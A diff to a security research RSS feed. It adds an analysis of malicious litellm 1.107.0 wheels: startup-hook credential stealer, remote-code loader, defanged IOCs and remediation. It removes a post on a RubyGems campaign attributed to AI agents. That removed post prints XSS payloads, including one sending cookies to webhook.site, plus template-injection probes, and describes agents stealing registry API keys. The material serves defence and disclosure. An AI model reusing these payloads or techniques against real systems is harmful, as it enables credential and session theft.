@@ -4,11 +4,178 @@
         <title>JFrog Security Research</title>
         <link>https://research.jfrog.com</link>
         <description>Homepage feed: latest vulnerabilities and security research posts from JFrog Security Research.</description>
-        <lastBuildDate>Wed, 21 Oct 2026 10:50:05 GMT</lastBuildDate>
+        <lastBuildDate>Wed, 21 Oct 2026 13:09:11 GMT</lastBuildDate>
         <docs>https://validator.w3.org/feed/docs/rss2.html</docs>
         <generator>Gridsome Home RSS</generator>
         <language>en</language>
         <atom:link href="https://research.jfrog.com/rss.xml" rel="self" type="application/rss+xml"/>
+        <item>
+            <title><![CDATA[LiteLLM Hijacked Again: Malicious 1.107.0 Wheels Steal Credentials and Load Remote Code]]></title>
+            <link>https://research.jfrog.com/post/litellm-hijacked-again/</link>
+            <guid>https://research.jfrog.com/post/litellm-hijacked-again/</guid>
+            <pubDate>Wed, 21 Oct 2026 00:00:00 GMT</pubDate>
+            <description><![CDATA[LiteLLM has been hijacked again: malicious `litellm` 1.107.0 wheels contain an interpreter-startup credential stealer and an hourly remote-code loader absent from the source distribution.]]></description>
+            <content:encoded><![CDATA[
+The JFrog Security Research team identified malicious code in `litellm` 1.107.0, a widely used Python interface and proxy for large language model providers. The payload wheels are a functional copy of the legitimate project with three additional files that execute at Python startup, steal a broad set of credentials and secrets, and provide an hourly remote-code execution channel. The payload can run even when an application never imports `litellm`.
+
+This is the second documented hijacking of LiteLLM in 2026. The new compromise is especially instructive because the published source distribution does not contain the three payload files found in the wheel. Reviewers who inspect only source code, a Git tag, or an sdist can therefore miss malicious behavior delivered in a platform-specific binary artifact.
+
+The open source community is actively following the new incident in [LiteLLM issue #47826](https://github.com/BerriAI/litellm/issues/47826).
+
+All seven PyPI wheels for `litellm` 1.107.0 contain the payload, across macOS, Linux, musl Linux, and Windows targets. The source tarball lacks `cook.pth`, `cook.py`, and `sitecustomize.py`, while its `pyproject.toml` contains an added `data = "cook"` setting that is absent from the corresponding Git tag. Our local copy of the source distribution likewise contains this setting but not the three malicious payload files.
+
+The payload entries share ZIP timestamps and metadata with legitimate wheel files, indicating that they were included during normal wheel construction rather than appended through manual ZIP repacking. This narrows the likely point of injection, but it does not reveal who altered the build tree, how that alteration occurred, or how the artifacts were published. The exact build or publishing compromise remains unknown.
+
+![](/img/RealTimePostImage/post/litellm-hijacked-again/pypi-litellm.png)
+
+## LiteLLM was already hijacked
+
+In March 2026, JFrog Security Research [documented LiteLLM's first compromise](https://research.jfrog.com/post/litellm-compromised-teampcp/). Its pipeline ran a malicious, unpinned Trivy 0.69.4 release, exposing CI/CD and publishing credentials.
+
+The stolen credentials were used to publish backdoored `litellm` versions 1.82.7 and 1.82.8, which harvested credentials, spread across Kubernetes nodes, and installed a persistent backdoor. JFrog tracks those releases under XRAY-955589.
+
+The new 1.107.0 compromise uses different payloads and infrastructure. No evidence currently links it to TeamPCP or the earlier access path, so the incidents should be treated as separate campaigns.
+
+## The source archive and built wheel tell different stories
+
+Its `RECORD` manifest includes three files under `litellm-1.107.0.data/purelib/`:
+
+```text
+litellm-1.107.0.data/purelib/cook.pth
+litellm-1.107.0.data/purelib/cook.py
+litellm-1.107.0.data/purelib/sitecustomize.py
+```
+
+Python wheel installers place files from this `purelib` directory into the environment's `site-packages` root. The corresponding 1.107.0 sdist contains none of these payload files. A comparison of the legitimate library tree found no other injected code: aside from expected wheel-specific artifacts such as the compiled Rust bridge and packaging differences, the rest of the wheel appears consistent with the legitimate release.
+
+This is wheel-level or build-artifact-level injection. The observable evidence is consistent with injection during or after wheel construction, while the matching metadata reported in issue #47826 favors inclusion during the ordinary build process over later manual repacking. It does not prove that a particular CI system, maintainer machine, PyPI account, or publishing credential was compromised.
+
+The distinction matters operationally. Source review can show that the main `litellm` code is legitimate while still missing executable files added to a built artifact. Package consumers and security tools must verify the exact wheel they install, including its `RECORD` contents and startup hooks, rather than treating an sdist or repository tag as a complete representation of every published artifact.
+
+At the time of writing, a read-only retrieval of `domain.txt`, the dead-drop file used by the remote loader, returned HTTP 200 with an empty plain-text body of exactly zero bytes and no redirect. No domain was present or contacted. This made the loader dormant at observation time, but changing the file can re-arm it. This time-sensitive result does not neutralize the wheel: the local `cook.py` credential stealer executes independently of `domain.txt` and remains active.
+
+## Python startup hooks trigger the compromise
+
+The malicious wheel uses two Python startup mechanisms. The first file, `cook.pth`, contains only:
+
+```python
+import cook
+```
+
+Python's `site` module processes `.pth` files during normal interpreter initialization and executes lines beginning with `import`. As a result, `cook.py` runs during normal Python startup in the affected environment, regardless of whether the application imports `litellm`.
+
+The second mechanism is `sitecustomize.py`. After processing site paths, Python automatically attempts to import a module named `sitecustomize`. The injected module uses this behavior to start a detached loader. Together, these hooks turn normal Python invocations in the environment, including administrative use of `pip`, into potential retriggers.
+
+Issue #47826 reports that the `sitecustomize.py` daemon path cannot complete on Windows because the code relies on `os.fork()`. It fails silently there, but `cook.pth` still imports `cook.py`, so Windows installations remain exposed to the credential stealer.
+
+## `cook.py` launches the `privcollect` credential stealer
+
+The two-line `cook.py` file contains a Base64-encoded, zlib-compressed Python program passed directly to `exec()`. Static decoding, without executing the sample, produces approximately 61 KB of plain Python source. The decoded program identifies itself as `privcollect`.
+
+The heavily shortened wrapper below preserves only a prefix of the malicious encoded data:
+
+```python
+import zlib as _3659944d, base64 as _35100b45
+exec(_3659944d.decompress(_35100b45.b64decode('eNrdfWt327qu4Pf+Ck/X...')))
+```
+
+The `cook.py` copy starts the collector in a daemon thread and uses `/tmp/.pc_once_72129118c59f5636c0bb` as a run-once marker. The marker is created only after successful exfiltration, so its absence does not establish that a host is clean. The payload also sets `PRIVCOLLECT_ACTIVE=1` to limit duplicate execution within inherited process environments.
+
+### What the stealer collects
+
+The collector is designed for developer workstations, CI/CD workers, cloud workloads, containers, and LiteLLM proxy deployments. It targets:
+
+- SSH files, GPG private keys, TLS private keys, shell histories, database client histories, and key files such as `.pem`, `.key`, `.p12`, and `.pfx`
+- Chromium-family passwords, cookies, web data, and history, plus Firefox login databases, key databases, and browsing history
+- AWS, Azure, and Google Cloud credentials; Kubernetes configurations and service-account tokens; Docker and Swarm secrets; GitHub CLI, `rclone`, and `.netrc` credentials
+- CI/CD and infrastructure-as-code secrets from GitLab Runner, Jenkins, Vault, Terraform, and Packer
+- Package manager and source-control credentials from `.git-credentials`, `.npmrc`, `.pypirc`, pip, Yarn, Maven, Gradle, Composer, RubyGems, and Cargo
+- AI development credentials and configurations for Cursor, Claude, Codex, Gemini, GitHub Copilot, Hugging Face, Kiro, Windsurf, Zed, Continue, aider, goose, opencode, Qwen, Cline, Roo, and Cody
+- Environment variables from the current process and every readable `/proc/<pid>/environ` file on Linux
+- Cloud instance credentials from AWS IMDS and ECS task metadata, Google Cloud metadata, and Azure IMDS
+- LiteLLM proxy data reached through `DATABASE_URL`, including `LiteLLM_CredentialsTable` and `LiteLLM_ProxyModelTable`
+
+The statically decoded source declares its main collection modules directly:
+
+![](/img/RealTimePostImage/post/litellm-hijacked-again/credential-modules.png)
+
+On Linux, the environment-variable collector also reads other processes' environments:
+
+![](/img/RealTimePostImage/post/litellm-hijacked-again/process-environment.png)
+
+The LiteLLM-specific database module is particularly damaging. It starts a child Python process, connects through Prisma, and attempts to dump stored LLM provider credentials from `LiteLLM_CredentialsTable` along with proxy model configuration from `LiteLLM_ProxyModelTable`. A compromised proxy host can therefore expose credentials for many upstream AI providers at once.
+
+The shortened decoded query logic confirms both table targets:
+
+![](/img/RealTimePostImage/post/litellm-hijacked-again/database-collection.png)
+
+The cloud module also attempts to validate stolen AWS credentials through `GetCallerIdentity`. Defenders should account for both local theft and subsequent use of exported cloud credentials outside the affected environment.
+
+## Encrypted exfiltration to a LiteLLM look-alike domain
+
+The stealer serializes collected data as JSON and encrypts it with a randomly generated AES-256-CBC key. It then wraps that key using an embedded RSA-4096 public key with OAEP-SHA256 and packages the encrypted material into a tar.gz archive.
+
+The decoded excerpt below is shortened, and its destination is defanged for publication:
+
+![](/img/RealTimePostImage/post/litellm-hijacked-again/c2-exfiltration.png)
+
+The archive is sent over plaintext HTTP to `hxxp[:]//www[.]litellm[.]dev/healthcheck`. The request includes the static token `XWiA8gZNa7NcX2XRoAEb` in the `X-Token` header and an `X-SHA256` header. Although the transport is unencrypted, the application-layer envelope prevents defenders from recovering stolen content from a network capture without the attacker's RSA private key.
+
+The domain `www[.]litellm[.]dev` is distinct from LiteLLM's legitimate `litellm[.]ai` domain. It must also not be confused with the previous incident's `models[.]litellm[.]cloud` exfiltration domain.
+
+## `sitecustomize.py` creates an hourly remote-code loader
+
+The injected `sitecustomize.py` module opens `/tmp/remote_code_loader.lock` and attempts to acquire a non-blocking exclusive `flock`. If no existing instance holds the lock, it calls `os.fork()`. The parent returns so Python startup can continue, while the child calls `os.setsid()`, redirects standard streams to `/dev/null`, changes its working directory to `/`, and enters an infinite hourly loop.
+
+Each cycle retrieves a prospective C2 domain from:
+
+`hxxps[:]//raw[.]githubusercontent[.]com/letters9813/pythonclient-test/main/domain.txt`
+
+If the first valid domain resolves, the loader synchronously runs a second embedded copy of `privcollect`. It then fetches `hxxp[:]//{domain}/codepy` over plaintext HTTP and executes the response with `compile()` and `exec()`. There is no integrity check or authentication for the downloaded Python code, giving whoever controls the resolved server arbitrary code execution under the affected user's privileges.
+
+The shortened local `sitecustomize.py` excerpt shows that an empty dead drop exits early, while a populated one enables remote execution. The constructed URL is defanged:
+
+![](/img/RealTimePostImage/post/litellm-hijacked-again/remote-code-loader.png)
+
+The embedded stealer differs from the `cook.py` copy in two important settings. It sets `PC_ONCE_PATH` to an empty string and `PC_ASYNC` to `False`. Consequently, it performs full collection and exfiltration synchronously on every successful hourly C2 cycle, while the `cook.py` copy is designed to complete once per host after successful exfiltration.
+
+The zero-byte `domain.txt` observation at the time of writing affects only this conditional hourly path. It does not prevent `cook.py` from collecting and sending local secrets whenever Python processes the malicious `.pth` file, and the loader can be re-armed by changing the dead-drop content.
+
+## Remediation
+
+- Avoid every `litellm` 1.107.0 wheel. Issue #47826 reports all seven platform wheels as affected and advises pinning `litellm==1.106.2` only after removing the startup hooks or from a newly built clean environment.
+- Isolate any host or container where the affected wheel was installed or Python was started in its environment. Treat reachable credentials and data as compromised.
+- Do not begin remediation by running `pip` inside an affected environment. Starting Python can execute `cook.pth` and `sitecustomize.py` again. First remove `cook.pth`, `cook.py`, `sitecustomize.py`, their matching compiled files under `__pycache__`, `/tmp/.pc_once_72129118c59f5636c0bb`, and `/tmp/remote_code_loader.lock` using tools that do not invoke the affected interpreter.
+- Inspect for and terminate detached Python processes associated with `sitecustomize.py`, especially a process holding `/tmp/remote_code_loader.lock`, using `setsid`, or running with `/` as its working directory. Also investigate `/tmp/.pc_sq_*` and `/tmp/.pc_e_*` artifacts.
+- Block and investigate access to `www[.]litellm[.]dev`, `raw[.]githubusercontent[.]com/letters9813/pythonclient-test/main/domain.txt`, and any domain returned by that dead drop. Preserve relevant proxy, DNS, endpoint, and cloud audit logs.
+- Rotate all credentials accessible to the affected host, including browser passwords, SSH and GPG keys, TLS private keys, package publishing tokens, source-control tokens, cloud and Kubernetes credentials, AI development tokens, `DATABASE_URL`, LiteLLM master and virtual keys, and every provider credential stored in `LiteLLM_CredentialsTable`.
+- Investigate any retrieval or execution of `/codepy`. Because this stage can execute arbitrary Python, its effects cannot be bounded by the behavior of the embedded stealer.
+- Perform a forensic rebuild of affected virtual environments, hosts, containers, and images from verified artifacts. Rebuilding is safer than attempting to prove that every startup artifact, downloaded stage, and exposed secret was removed.
+
+## Conclusions
+
+The malicious `litellm` 1.107.0 demonstrates a critical gap between source provenance and artifact integrity. The source distribution lacks the executable payload files, while the wheel installs them directly into `site-packages` and activates them before normal application code runs. The sdist's altered build setting and the metadata reported by the community are important investigative leads, but they do not establish the exact root cause.
+
+This second LiteLLM hijacking should not be conflated with the earlier TeamPCP incident. Both target the trust placed in a popular AI package and both steal broad developer and cloud credentials, but the current artifact uses different startup files, persistence behavior, and network infrastructure. Incident responders should scope each campaign using its own indicators.
+
+JFrog Xray and JFrog Curation detect the malicious `litellm` 1.107.0 using XRAY-955589.
+
+## Indicators of Compromise
+
+- `litellm` 1.107.0 malicious (PyPI) - XRAY-955589
+- Exfiltration URL: `hxxp[:]//www[.]litellm[.]dev/healthcheck`
+- Exfiltration domain: `www[.]litellm[.]dev`
+- C2 dead-drop URL: `hxxps[:]//raw[.]githubusercontent[.]com/letters9813/pythonclient-test/main/domain.txt`
+- Conditional remote payload URL: `hxxp[:]//{domain}/codepy`
+- Dead-drop repository: `letters9813/pythonclient-test`
+- Exfiltration token: `X-Token: XWiA8gZNa7NcX2XRoAEb`
+- Single-instance lock: `/tmp/remote_code_loader.lock`
+- Run-once marker: `/tmp/.pc_once_72129118c59f5636c0bb`
+- Temporary paths: `/tmp/.pc_sq_*` and `/tmp/.pc_e_*`
+- LiteLLM database targets: `LiteLLM_CredentialsTable` and `LiteLLM_ProxyModelTable`
+- Community tracking: [open LiteLLM security issue #47826](https://github.com/BerriAI/litellm/issues/47826)
+]]></content:encoded>
+        </item>
         <item>
             <title><![CDATA[PHP2Shell - All You Need to Know About CVE-2026-109618 and CVE-2026-109619]]></title>
             <link>https://research.jfrog.com/post/php2shell-all-you-need-to-know-about-cve-2026-109618-and-cve-2026-109619/</link>
@@ -899,254 +1066,6 @@ WASM key  npm_workvr_protect_key_v1          AES-256-GCM, hardcoded
             <pubDate>Tue, 15 Sep 2026 00:00:00 GMT</pubDate>
             <description><![CDATA[Your Mac runs a vulnerable version of Parallels Desktop. A malicious package, compromised CI job, or other unprivileged process is already running on it. No admin access. No Parallels-signed client. One appliance-install request later, attacker-controlled code runs as root. While testing Desktop 26.4.0 (build 57513) on Apple silicon, we found that an unprivileged local user...]]></description>
             <content:encoded><![CDATA[Your Mac runs a vulnerable version of Parallels Desktop. A malicious package, compromised CI job, or other unprivileged process is already running on it. No admin access. No Parallels-signed client. One appliance-install request later, attacker-controlled code runs as root. While testing Desktop 26.4.0 (build 57513) on Apple silicon, we found that an unprivileged local user...]]></content:encoded>
-        </item>
-        <item>
-            <title><![CDATA[New packages identified in GemStuffer 'OpenAI Swarm' malicious RubyGems campaign]]></title>
-            <link>https://research.jfrog.com/post/gemstuffer-openai-rubygems/</link>
-            <guid>https://research.jfrog.com/post/gemstuffer-openai-rubygems/</guid>
-            <pubDate>Tue, 15 Sep 2026 00:00:00 GMT</pubDate>
-            <description><![CDATA[The JFrog Security Research team investigated the GemStuffer campaign done by rogue OpenAI agents - we found more than 3000 RubyGems packages associated with the coordinated attacks.]]></description>
-            <content:encoded><![CDATA[
-JFrog Security Research is actively monitoring the recent GemStuffer incident, and using our extensive Catalog of RubyGems artifacts, managed to identify **3,022 campaign-associated RubyGems packages, covering 3,315 distinct name/version pairs**. The identified malicious packages used RubyDoc’s documentation workers, the feature that generates reference pages for Ruby packages, to fetch websites and send the results back through RubyGems. Some also attempt to obtain other users' registry API keys. A separate group of malicious packages places JavaScript and template expressions in package metadata. If your service builds documentation or processes uploaded gems, check whether package-controlled files can execute code or inject content into privileged pages. In this blog, we present newly-analyzed malicious payloads related to the attack, our insights, and the full list of packages we found to be associated with the GemStuffer campaign.
-
-<div align="center">
-
-![][image1]
-
-</div>
-
-The [RubyHack investigation, published on September 11](https://www.rubyhack.ai/), linked the May and June activity from the GemStuffer campaign to OpenAI agents, using package contents and overlap with the German wiki incident, in which OpenAI confirmed its agents edited a public wiki. Our work expands the package inventory and examines how representative payloads work.
-
-## Malicious packages created by AI Agents \- which attributes can we observe?&nbsp;
-
-Not all of the packages in the GemStuffer campaign contained malicious Ruby code, e.g. within `evil.rb`, as seen before, but rather in metadata, which made them less convenient to find.
-
-We started by checking the already known package names used in this attack we found reported. Our first dataset had 557 releases, including several versions per Gem.
-
-The first investigation began by looking at the bigger picture \- we looked at releases that were published before and after the known attack windows, and examined them. In a sea of tens of thousands of packages, several ones were immediately obvious:
-
-- Many of the package names had `oai` (OpenAI) in their names.  
-- GPT models are known for overusing the term `probe`, similar to Claude's signature "You're absolutely right\!" or "honest caveat" phrases. We found a large amount of packages with "probe" in their names from the dates of the attacks, all attributed to this campaign.  
-- More terms that were present in package names were `ssrf`, `fetch`, `proxy`, `scrape`, `yard`, and `payload`. We were unable to attribute *all* of them to the campaign, but the vast majority were.  
-- Package names often included suffixes, such as a unix timestamp for their creation date. For example, the suffix of `oaifetchmde1778385544` decodes to May 10 at 03:59:04 UTC. Its first recorded upload was at 03:59:20 UTC, 16 seconds later.  
-- The package names also referenced Lambeth, Wandsworth, and Southwark, whose public meeting calendars and documents the payloads attempted to retrieve. The agent swarm may have used these sites to test the fetching and data-return mechanism as a proof of concept, although the original task prompts are unavailable.  
-- Other packages used disposable names e.g. `zztest4098`, `zmeta7631`, sequential suffixes (`southwarkssrfhack`, `southwarkssrfhack2`, ..., `southwarkssrfhack5`), or long generated strings.  
-- Metadata included more hints. We checked 1,388 distinct author names. Common values included `x`, `a`, `d`, `tmp`, `oai`, `research`, and `SR`. In July, the agents also used the `Testing <Animal>` format (`Testing Buffalo`, `Testing Wolf`, `Test Rhino`, etc). We also found `John Doe` as an author name for several packages.  
-- Dash padded package names such as `a--00cfmapjson726`.
-
-### Attack windows
-
-We observed the following upload windows for the packages affiliated with the campaign:
-
-| Date | First to last upload, UTC | Packages | Releases |
-| :---- | :---- | ----: | ----: |
-| 2026-05-05 | 12:01:29 to 18:44:14 | 5 | 7 |
-| 2026-05-08 | 15:59:43 to 22:18:01 | 48 | 60 |
-| 2026-05-09 | 12:08:43 to 13:02:33 | 7 | 14 |
-| 2026-05-10 | 03:59:20 to 16:44:35 | 6 | 8 |
-| 2026-05-11 | 04:00:37 to 20:34:24 | 295 | 319 |
-| 2026-05-12 | 01:20:14 to 08:01:00 | 2,359 | 2,476 |
-| 2026-05-26 | 19:05:29 to 21:51:51 | 2 | 12 |
-| 2026-05-27 | 03:51:53 to 03:53:01 | 2 | 2 |
-| 2026-06-18 | 17:53:31 to 20:52:56 | 83 | 84 |
-| 2026-07-07 | 03:03:09 to 18:13:42 | 215 | 333 |
-
-## Analysis of the Ruby payloads
-
-### `slnleaker5`: RubyGems token stealer
-
-`slnleaker5` version `0.0.1` explicitly loads `script.rb` through `.yardopts`. Its crawler collects council pages and linked documents, writes an `INDEX.txt` and numbered response files, and builds a child gem named `slnpayloadx` followed by the current timestamp.
-
-The credential logic at lines 96-106 goes beyond using its embedded key. It cycles through four forms of the legacy API-key endpoint, making up to 24 harvest-and-upload attempts. It searches each response for a RubyGems key and falls back to its hardcoded value if none is found:
-
-<div align="center">
-
-![Ruby expression that selects a RubyGems API key matched in the response text, or falls back to the hardcoded KEY value.][image2]
-
-</div>
-
-The selected value is then used as the upload request's `Authorization` header. The script tries several spellings of the upload path and stops on an HTTP 200 response. Those path variations show probing; they do not establish that any normalization bypass worked.
-
-This matches the mechanism later described in [RubyGems' legacy API-key advisory](https://blog.rubygems.org/2026/07/22/security-advisory-legacy-api-key-leak.html). Under the affected compression and cache-header behavior, a successful legacy sign-in response could be cached at a CDN edge and returned to another caller for up to an hour, including an unauthenticated caller. Ruby's default gzip request behavior was relevant to the vulnerable path.
-
-`slnleaker5` was published at **03:15:22.939 UTC on May 12**. RubyGems says the vulnerability was reported on July 6 and the fix was deployed on July 9\. The source therefore shows an attempt to exploit that behavior before the later report.
-
-<div align="center">
-
-![Ruby code from slnleaker5 that cycles through legacy API-key endpoints, extracts a registry key, and attempts gem uploads until an HTTP 200 response.][image3]
-
-</div>
-
-&nbsp;
-
-&nbsp;
-
-### `f2fe-s1`: Collects Wandsworth's data, publishes to separate Gem
-
-In `f2fe-s1` version `0.0.1`, `loader.rb` fetches public meeting calendars and linked documents from Wandsworth’s council website, then attempts to publish the collected data in a new gem named `f2fe-scraped`.
-
-<div align="center">
-
-![Ruby loader from f2fe-s1 that fetches Wandsworth council calendar and web-service endpoints, follows redirects, and collects meeting IDs and document links.][image4]
-
-</div>
-
-The fetch helper at lines 7-18 uses `Net::HTTP`, disables certificate verification, and follows redirects. The loader tries several calendar and web-service endpoints. It supplies eight date-ranges to `GetMeetings`, then extracts meeting IDs and document links from the responses.
-
-The collection keeps up to 150 meeting IDs and 120 document URLs. It stores responses in `p0.txt`, `ids.txt`, and `d0.bin`, then builds a gem named `f2fe-scraped`. Its version is `0.0.` followed by the current Unix timestamp.
-
-<div align="center">
-
-![Ruby code from f2fe-s1 that builds a gem containing collected council data and posts it to RubyGems using an embedded API key.][image5]
-
-</div>
-
-Lines 59-62 build the gem and attempt to POST it to RubyGems' `/api/v1/gems` endpoint using an embedded API key. The registry is the return channel for the collected data.
-
-### `yardxabc889`: Collects Lambeth's data, republishes in same Gem
-
-`yardxabc889` version `0.0.1` uses `.yardopts` to load `evil.rb`.
-
-The script fetches Lambeth’s calendar page and writes up to 500,000 characters of the response, or an error message, into `README.md`. It then removes the payload’s YARD load directive, builds version `0.0.2` of the same gem, `yardxabc889`, and attempts to publish that version with the collected data:
-
-<div align="center">
-
-![Ruby code from yardxabc889 that removes the payload loader from .yardopts and changes the gem version from 0.0.1 to 0.0.2.][image6]
-
-</div>
-
-The replacement `.yardopts` removes `--load ./evil.rb`. The script builds `yardxabc889-0.0.2.gem` and attempts to publish it using an embedded credential.
-
-<div align="center">
-
-![Ruby code from yardxabc889 that rebuilds the modified gem and attempts to publish it to RubyGems using an embedded credential.][image7]
-
-</div>
-
-### `southpxdatapp6pi`: Collects Southwark's data, stores in webhook URLs
-
-Unlike the previous two payloads, `southpxdatapp6pi` version `0.0.1` attempts to store the fetched data in RubyGems webhook configuration rather than publishing it in a gem.
-
-The script requests Southwark's calendar page, prefixes the body with the HTTP status, compresses it with zlib, and applies URL-safe Base64 encoding. It removes padding and splits the result into chunks of at most 220 characters.
-
-For each chunk, it sends a request to `/api/v1/web_hooks`, setting `gem_name` to `southpxdatapp6pi` and placing the data in a URL shaped like this:
-
-```
-https://example.com/A000/<encoded-chunk>
-https://example.com/A001/<encoded-chunk>
-https://example.com/ZZEND/<chunk-count>
-```
-
-<div align="center">
-
-![Ruby code from southpxdatapp6pi that compresses and Base64-encodes a Southwark council response, then stores numbered chunks and an end marker in RubyGems webhook URLs.][image8]
-
-</div>
-
-The write destination in the code is the RubyGems webhook API. `example.com` is embedded in the stored value; nothing in this sample points to a real C2. If the registrations succeed, the response data is held in webhook configuration; a separate reader could reconstruct the ordered chunks. The script also tries to record an `ERR/` marker on failure. This package also uses the same embedded API-key value as `yardxabc889`.
-
-## Analysis of malicious package metadata
-
-The July samples target another set of consumers: RubyGems package pages (ex. Browsed to by users), administrative views, and metadata parsers. They can matter even when the package's Ruby library does almost nothing.
-
-### XSS in descriptions and author fields
-
-Some of the packages contain XSS proof-of-concepts embedded in their metadata, attempting to prove user hijacking, in cases where users view the rendered metadata.
-
-In `xss-test-gem` version `0.1.0`, the only listed Ruby source is:
-
-<div align="center">
-
-![The entire xssgem.rb library: an Xssgem module that only defines VERSION as 0.1.0.][image9]
-
-</div>
-
-The attack strings are in the serialized gemspec's `description`, lines 13-20. They include an image error handler, a script element, a `javascript:` link, and an SVG load handler:
-
-<div align="center">
-
-![Gem metadata containing XSS probes in the description, including an image error handler, a script element, a JavaScript link, and an SVG load handler.][image10]
-
-</div>
-
-Each tests a different rendering path. The same description includes a `data-controller=dump` element and malformed MathML/HTML nesting.
-
-We also found several packages with interesting authors:
-
-| Package | Author |
-| :---- | :---- |
-| `attacker-xss-admin-1@0.0.1` | `"<script>new Image().src=""https://d96877a5q295v25se560q7ntmmwky7x8o.oast.online/admin-xss-author""</script>"` |
-| `xssname-1783397821@0.0.1` | `<img src=x onerror=fetch('https://webhook.site/steal?c='+document.cookie)>` |
-| `test-apex-gem@0.1.3` | `<img src=x onerror=alert(1)>` |
-
-<div align="center">
-
-![Metadata for xss-test-gem showing injected HTML and JavaScript payloads in the package description.][image11]
-
-</div>
-
-### Template expressions and YAML-labeled tests
-
-Three uploads arrived within five seconds on July 7:
-
-| Package | Upload time, UTC | Author |
-| :---- | :---- | :---- |
-| `test-ssti-0@0.1.0` | 07:25:48.110 | `<%= 7*7 %>` |
-| `test-ssti-1@0.1.0` | 07:25:50.094 | `${7*7}` |
-| `test-ssti-4@0.1.0` | 07:25:52.741 | `<%25= 7*7 %>` |
-
-The first is an ERB expression. The second tests expression-language interpolation. The third becomes the ERB form after percent-decoding `%25` to `%`. The arithmetic result would be 49 in a compatible evaluator, giving the operator a simple string to look for.
-
-## Remediation guidance
-
-### Step 1: Check the execution surface
-
-Review CI jobs that processed the identified versions (see full list below). Look for [YARD](https://yardoc.org/) `--load` directives, package-controlled plugins, extension build steps, and requests to generate documentation.
-
-If an untrusted payload ran on a worker, isolate it and preserve the build logs and artifacts. Rebuild the worker from a trusted image before reuse. Rotate credentials that the process could access.
-
-### Step 2: Remove unnecessary worker privileges
-
-Run untrusted documentation builds in disposable environments without registry-publishing keys, cloud credentials, or host mounts. Deny unnecessary outbound access, including access to cloud metadata and internal services. A documentation job that only reads packages should not be able to publish them.
-
-Do not honor arbitrary package-supplied load options in a trusted process. If a service must support executable documentation helpers, treat the entire job as untrusted code execution and isolate it accordingly.
-
-### Step 3: Audit registry credentials and account changes
-
-RubyGems reports that it fixed the cache issue and revoked legacy API keys. Follow their [advisory](https://blog.rubygems.org/2026/07/22/security-advisory-legacy-api-key-leak.html) and inspect account history for unexpected versions, yanks, owner changes, trusted publishers, and webhooks.
-
-Use scoped credentials, MFA that applies to API operations, and short-lived trusted publishing where possible.
-
-### Step 4: Treat metadata as untrusted input
-
-Escape author and description fields in public and administrative views. Where HTML is allowed, use a maintained sanitizer that handles event attributes, URL schemes, SVG, and parser edge cases. Do not pass metadata values back through a template evaluator.
-
-Use restricted metadata deserialization. Inspect suspicious values as text rather than loading gemspec code or unsafe YAML objects.
-
-## IOCs
-
-| Package | Versions | Xray ID |
-| :---- | :---- | :---- |
-| slnleaker5 | 0.0.1 | XRAY-982350 |
-| f2fe-s1 | 0.0.1 | XRAY-1024400 |
-| yardxabc889 | 0.0.1 | XRAY-982421 |
-| southpxdatapp6pi | 0.0.1 | XRAY-982441 |
-| xss-test-gem | 0.1.0 \- 0.3.5 | XRAY-1079280 |
-| test-apex-gem | 0.1.1, 0.1.3 | XRAY-1079209 |
-
-… and many more. The full list can be found [here](/gemstuffer.csv).
-
-[image1]: /img/RealTimePostImage/post/gemstuffer.png
-[image2]: /img/RealTimePostImage/post/gemstuffer-openai-rubygems/image2.png
-[image3]: /img/RealTimePostImage/post/gemstuffer-openai-rubygems/image3.png
-[image4]: /img/RealTimePostImage/post/gemstuffer-openai-rubygems/image4.png
-[image5]: /img/RealTimePostImage/post/gemstuffer-openai-rubygems/image5.png
-[image6]: /img/RealTimePostImage/post/gemstuffer-openai-rubygems/image6.png
-[image7]: /img/RealTimePostImage/post/gemstuffer-openai-rubygems/image7.png
-[image8]: /img/RealTimePostImage/post/gemstuffer-openai-rubygems/image8.png
-[image9]: /img/RealTimePostImage/post/gemstuffer-openai-rubygems/image9.png
-[image10]: /img/RealTimePostImage/post/gemstuffer-openai-rubygems/image10.png
-[image11]: /img/RealTimePostImage/post/gemstuffer-openai-rubygems/image11.png]]></content:encoded>
         </item>
         <item>
             <title><![CDATA[Bifrost is vulnerable to Unauthenticated Remote Code Execution via MCP Stdio Client Registration]]></title>
